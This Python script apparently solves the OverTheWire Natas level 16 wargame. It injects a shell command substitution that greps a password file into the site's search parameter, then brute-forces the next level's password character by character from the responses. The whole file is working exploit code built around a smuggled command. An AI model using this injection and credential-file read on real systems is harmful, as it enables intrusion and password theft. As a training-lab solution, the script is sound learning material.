import logging
import requests

logging.basicConfig(level=logging.DEBUG)

print("Start here.....")

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

url = "http://natas16.natas.labs.overthewire.org"
auth_header = "auth_header"

bf_strings = "0aA1bB2cC3dD4eE5fF6gG7hH8iI9jJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ"
keyword = "acquaint"
force_count = 0
password = ""

while len(password) < 32:  # Loop until password length is 32
    for char in bf_strings:
        try:
            # Construct the search term with the current password guess
            search_term = f"$(grep -E ^{password}{char}.* /etc/natas_webpass/natas17){keyword}"

            # Log the current search term
            force_count += 1
            logging.debug(f"| {force_count} | Current: {password} - Length: {len(password)} | On test char: {char} ")

            # Make the HTTP request with parameters and headers
            res = requests.get(
                url,
                params={"needle": search_term, "submit": "Search"},
                headers={"Authorization": auth_header},
                proxies=proxies
            )

            # Check if the character is part of the password
            if keyword not in res.text:
                password += char
                break  # Exit inner loop once a valid character is found

        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

print(f"Final: {password} - Total try: {force_count}")
